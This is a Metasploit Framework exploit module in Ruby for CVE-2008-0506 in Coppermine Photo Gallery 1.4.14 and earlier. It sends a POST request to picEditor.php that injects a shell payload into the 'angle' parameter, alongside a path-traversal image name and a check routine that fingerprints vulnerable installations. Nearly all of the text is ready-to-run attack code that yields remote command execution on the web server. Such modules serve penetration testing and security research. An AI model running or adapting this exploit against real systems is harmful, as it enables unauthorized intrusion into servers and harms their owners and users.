##
# $Id: coppermine_piceditor.rb 9671 2010-07-03 06:21:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Coppermine Photo Gallery <= 1.4.14 picEditor.php Command Execution',
			'Description'    => %q{
					This module exploits a vulnerability in the picEditor.php script of Coppermine
				Photo Gallery. When configured to use the ImageMagick library, the 'quality', 'angle',
				and 'clipval' parameters are not properly escaped before being passed to the PHP
				'exec' command.

				In order to reach the vulnerable 'exec' call, the input must pass several validation
				steps.

				The vulnerabilities actually reside in the following functions:

				image_processor.php: rotate_image(...)
				include/imageObjectIM.class.php: imageObject::cropImage(...)
				include/imageObjectIM.class.php: imageObject::rotateImage(...)
				include/imageObjectIM.class.php: imageObject::resizeImage(...)
				include/picmgmt.inc.php: resize_image(...)

				NOTE: Use of the ImageMagick library is a non-default option. However, a user can
				specify its use at installation time.
			},
			'Author'         =>
				[
					'Janek Vind', # original discovery/exploit
					'jduck'       # metasploit version
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9671 $',
			'References'     =>
				[
					[ 'CVE', '2008-0506' ],
					[ 'OSVDB', '41676' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/5019' ],
					[ 'URL', 'http://forum.coppermine-gallery.net/index.php?topic=50103.0' ]
				],
			'Privileged'     => true, # web server context
			'Payload'        =>
				{
					'DisableNops' => true,
					'BadChars'    => '\'', # input gets passed to htmlentities
					'Space'       => 1024,
				},
			'Platform'       => [ 'unix' ],
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Jan 30 2008',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('URI', [ true, "Coppermine directory path", "/cpg1414" ]),
				], self.class)
	end

	def check
		res = send_request_raw({
			'uri' => datastore['URI'] + '/picEditor.php'
		}, 25)

		if (res and res.body =~ /Coppermine Picture Editor/i)
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end


	def exploit

		valid_imgs = %w{thumb_audio.jpg thumb_avi.jpg thumb_doc.jpg thumb_document.jpg thumb_gz.jpg
			thumb_htm.jpg thumb_html.jpg thumb_mid.jpg thumb_midi.jpg thumb_mov.jpg thumb_movie.jpg
			thumb_mp3.jpg thumb_mpeg.jpg thumb_mpg.jpg thumb_nopic.jpg thumb_ogg.jpg thumb_pdf.jpg
			thumb_private.jpg thumb_qtv.jpg thumb_ra.jpg thumb_ram.jpg thumb_rar.jpg thumb_rm.jpg
			thumb_rmj.jpg thumb_swf.jpg thumb_txt.jpg thumb_wav.jpg thumb_wma.jpg thumb_wmv.jpg
			thumb_xls.jpg thumb_zip.jpg}
		img = '../../images/' + valid_imgs[rand(valid_imgs.length)]
		# suppress errors from convert
		angle = rand_text_numeric(1+rand(8)) + ' -quiet 1 2'
		# and exec our cmd :)
		angle += ';' + payload.encoded + ';#'

		res = send_request_cgi({
			'method'    => 'POST',
			'uri'	      => datastore['URI'] + "/picEditor.php",
			'vars_post' =>
				{
					'angle' => angle,
					'quality' => '50',  # not required, but fixes an error message
					'newimage' => img
				}
			}, 25)

		if (res and res.code == 200)
			print_status("Successfully POST'd exploit data")
		else
			raise RuntimeError, "Error POSTing exploit data"
		end

		handler
	end

end
